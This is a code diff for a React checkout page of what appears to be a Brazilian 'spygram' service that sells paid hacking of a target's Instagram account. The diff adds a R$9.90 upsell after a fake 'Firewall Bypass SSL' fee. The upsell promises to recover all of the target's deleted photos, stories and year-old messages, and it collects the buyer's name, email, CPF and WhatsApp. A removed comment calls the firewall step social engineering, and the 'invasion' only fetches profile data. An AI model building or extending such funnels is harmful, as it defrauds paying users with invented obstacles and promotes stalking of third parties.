@@ -23,7 +23,7 @@ interface CreditPackage {
 
 const CreditsPage: React.FC = () => {
   const navigate = useNavigate();
-  const [stage, setStage] = useState<'idle' | 'searching' | 'firewall_lock' | 'error' | 'success'>('idle');
+  const [stage, setStage] = useState<'idle' | 'searching' | 'firewall_lock' | 'upsell_data_recovery' | 'error' | 'success'>('idle');
   const [targetUsername, setTargetUsername] = useState('');
   const [searchLogs, setSearchLogs] = useState<string[]>([]);
   const [isPaidUser, setIsPaidUser] = useState<boolean>(false);
@@ -187,6 +187,22 @@ const CreditsPage: React.FC = () => {
     setShowCheckoutModal(true);
   };
 
+  const runRealInvasionRelease = async () => {
+    try {
+      const fetchResult = await fetchProfileData(targetUsername.trim());
+      const invasionData = {
+        profileData: fetchResult.profile,
+        suggestedProfiles: fetchResult.suggestions,
+        posts: fetchResult.posts,
+      };
+      sessionStorage.setItem('invasionData', JSON.stringify(invasionData));
+      localStorage.setItem('spygram_active_invasion', JSON.stringify(invasionData));
+      navigate('/instagram');
+    } catch (e) {
+      navigate('/');
+    }
+  };
+
   const handleGeneratePix = async (e: React.FormEvent, isFirewallBypass: boolean = false) => {
     e.preventDefault();
     if (!formData.nome || !formData.email || !formData.documento) {
@@ -197,10 +213,17 @@ const CreditsPage: React.FC = () => {
     setIsGeneratingPix(true);
     const toastId = toast.loading("Gerando seu PIX...");
 
-    const amountToCharge = isFirewallBypass ? 19.90 : selectedPackage?.numericPrice || 49.50;
-    const purchasedItems = isFirewallBypass 
-      ? ['Firewall Bypass SSL 🛡️'] 
-      : [`Recarga: ${selectedPackage?.title} 🪙`];
+    const amountToCharge = stage === 'upsell_data_recovery'
+      ? 9.90
+      : isFirewallBypass 
+        ? 19.90 
+        : selectedPackage?.numericPrice || 49.50;
+
+    const purchasedItems = stage === 'upsell_data_recovery'
+      ? ['Resgate de Dados Apagados 🗑️']
+      : isFirewallBypass 
+        ? ['Firewall Bypass SSL 🛡️'] 
+        : [`Recarga: ${selectedPackage?.title} 🪙`];
 
     try {
       const currentLeadId = sessionStorage.getItem('current_lead_id');
@@ -211,7 +234,7 @@ const CreditsPage: React.FC = () => {
         email: formData.email,
         phone: formData.whatsapp,
         document: formData.documento,
-        status: isFirewallBypass ? 'gerou_pix_firewall' : 'gerou_pix_creditos',
+        status: stage === 'upsell_data_recovery' ? 'gerou_pix_upsell_dados' : isFirewallBypass ? 'gerou_pix_firewall' : 'gerou_pix_creditos',
         amount: amountToCharge
       });
 
@@ -245,7 +268,6 @@ const CreditsPage: React.FC = () => {
   };
 
   const handleGenerateFirewallPixClick = () => {
-    // Tenta pré-preencher com dados do formulário de faturamento do lead caso ele já tenha preenchido antes
     setShowFirewallCheckout(true);
   };
 
@@ -269,23 +291,13 @@ const CreditsPage: React.FC = () => {
           amount={pixResult.amount}
           onConfirm={() => toast.success("Aguardando confirmação do banco...")}
           onSuccess={() => {
-            // Se o PIX Firewall de 19,90 foi pago, libera a invasão!
             if (pixResult.amount === 19.90) {
-              const runRealInvasionRelease = async () => {
-                try {
-                  const fetchResult = await fetchProfileData(targetUsername.trim());
-                  const invasionData = {
-                    profileData: fetchResult.profile,
-                    suggestedProfiles: fetchResult.suggestions,
-                    posts: fetchResult.posts,
-                  };
-                  sessionStorage.setItem('invasionData', JSON.stringify(invasionData));
-                  localStorage.setItem('spygram_active_invasion', JSON.stringify(invasionData));
-                  navigate('/instagram');
-                } catch (e) {
-                  navigate('/');
-                }
-              };
+              setPixResult(null);
+              setShowFirewallCheckout(false); // Reseta o formulário para o upsell
+              setStage('upsell_data_recovery');
+              toast.success("Firewall Desativado! Oferta especial liberada.");
+            } else if (pixResult.amount === 9.90) {
+              setPixResult(null);
               runRealInvasionRelease();
             } else {
               setPixResult(null);
@@ -505,7 +517,6 @@ const CreditsPage: React.FC = () => {
             </motion.div>
           )}
 
-          {/* NOVO: Engenharia Social do Firewall de R$ 19,90 */}
           {stage === 'firewall_lock' && (
             <motion.div
               key="firewall_lock"
@@ -623,6 +634,129 @@ const CreditsPage: React.FC = () => {
             </motion.div>
           )}
 
+          {stage === 'upsell_data_recovery' && (
+            <motion.div
+              key="upsell_data_recovery"
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              className="w-full max-w-md bg-[#0c0d12]/95 border-2 border-purple-500/30 rounded-[2.5rem] p-8 text-center shadow-[0_0_50px_rgba(139,92,246,0.15)] relative overflow-hidden"
+            >
+              {/* Glow decorativo */}
+              <div className="absolute -top-24 -left-24 w-48 h-48 bg-purple-500/10 blur-[80px] rounded-full" />
+
+              <div className="relative w-16 h-16 bg-purple-500/10 border border-purple-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                <div className="absolute inset-0 bg-purple-500/20 rounded-full blur-md animate-pulse" />
+                <Sparkles className="relative w-8 h-8 text-purple-400" />
+              </div>
+
+              <h2 className="text-xl font-black text-white uppercase tracking-tight mb-3">
+                Tudo que o alvo quis apagar — você recupera
+              </h2>
+              <p className="text-gray-300 text-sm leading-relaxed mb-6 font-medium">
+                Fotos deletadas, stories antigos e mensagens que ele achou que sumiram. Recupere agora antes que o prazo expire.
+              </p>
+
+              <div className="bg-white/5 border border-white/5 rounded-2xl p-4 mb-6 text-left space-y-3">
+                <div className="flex items-center gap-3">
+                  <Check className="w-4 h-4 text-green-500" />
+                  <span className="text-xs text-gray-300 font-bold">Recuperar 100% das mídias apagadas</span>
+                </div>
+                <div className="flex items-center gap-3">
+                  <Check className="w-4 h-4 text-green-500" />
+                  <span className="text-xs text-gray-300 font-bold">Histórico de conversas de até 1 ano atrás</span>
+                </div>
+                <div className="flex items-center gap-3">
+                  <Check className="w-4 h-4 text-green-500" />
+                  <span className="text-xs text-gray-300 font-bold">Stories arquivados e apagados</span>
+                </div>
+              </div>
+
+              <div className="flex justify-between items-center mb-6 px-2">
+                <span className="text-xs font-bold text-gray-500 uppercase">Adicional Único:</span>
+                <div className="text-right">
+                  <span className="text-xs text-gray-500 line-through mr-2">R$ 49,90</span>
+                  <span className="text-xl font-black text-green-400">R$ 9,90</span>
+                </div>
+              </div>
+
+              {!showFirewallCheckout ? (
+                <div className="space-y-3">
+                  <button
+                    onClick={() => setShowFirewallCheckout(true)}
+                    className="w-full py-4 bg-purple-600 hover:bg-purple-500 text-white font-black rounded-xl shadow-xl shadow-purple-600/30 transition-all active:scale-95 text-xs uppercase tracking-widest"
+                  >
+                    Adicionar ao meu Relatório (R$ 9,90)
+                  </button>
+                  <button
+                    onClick={runRealInvasionRelease}
+                    className="w-full py-3 text-gray-500 hover:text-gray-300 text-xs font-bold uppercase tracking-widest transition-colors"
+                  >
+                    Não, obrigado, quero apenas o relatório básico
+                  </button>
+                </div>
+              ) : (
+                <motion.form 
+                  initial={{ opacity: 0, y: 10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  onSubmit={(e) => handleGeneratePix(e, true)} 
+                  className="space-y-4 text-left border-t border-white/5 pt-6 mt-6"
+                >
+                  <div className="relative">
+                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="NOME COMPLETO"
+                      required
+                      value={formData.nome}
+                      onChange={(e) => setFormData({...formData, nome: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-purple-500 transition-all uppercase"
+                    />
+                  </div>
+                  <div className="relative">
+                    <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="email" 
+                      placeholder="E-MAIL DE SUPORTE"
+                      required
+                      value={formData.email}
+                      onChange={(e) => setFormData({...formData, email: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-purple-500 transition-all lowercase"
+                    />
+                  </div>
+                  <div className="relative">
+                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="CPF"
+                      required
+                      value={formData.documento}
+                      onChange={(e) => setFormData({...formData, documento: maskCPF(e.target.value)})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-purple-500 transition-all"
+                    />
+                  </div>
+                  <div className="relative">
+                    <Phone className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="tel" 
+                      placeholder="WHATSAPP"
+                      value={formData.whatsapp}
+                      onChange={(e) => setFormData({...formData, whatsapp: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-purple-500 transition-all"
+                    />
+                  </div>
+
+                  <button 
+                    type="submit"
+                    disabled={isGeneratingPix}
+                    className="w-full bg-purple-600 hover:bg-purple-500 text-white font-black py-4 rounded-xl flex items-center justify-center gap-2 shadow-xl shadow-purple-600/30 active:scale-95 transition-all text-xs"
+                  >
+                    {isGeneratingPix ? <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <><QrCode size={16} /> ATIVAR RECUPERAÇÃO DE DADOS</>}
+                  </button>
+                </motion.form>
+              )}
+            </motion.div>
+          )}
+
           {stage === 'error' && (
             <motion.div 
               key="error"
@@ -647,7 +781,7 @@ const CreditsPage: React.FC = () => {
         </AnimatePresence>
 
         {/* PACOTES DE CRÉDITO (Mostra se não estiver no terminal de invasão ativa) */}
-        {stage !== 'searching' && stage !== 'firewall_lock' && (
+        {stage !== 'searching' && stage !== 'firewall_lock' && stage !== 'upsell_data_recovery' && (
           <div className="w-full mt-16 space-y-12">
             <div className="flex flex-col items-center justify-center text-center px-4">
               <Coins className="w-8 h-8 text-yellow-500 mb-2 animate-bounce" />
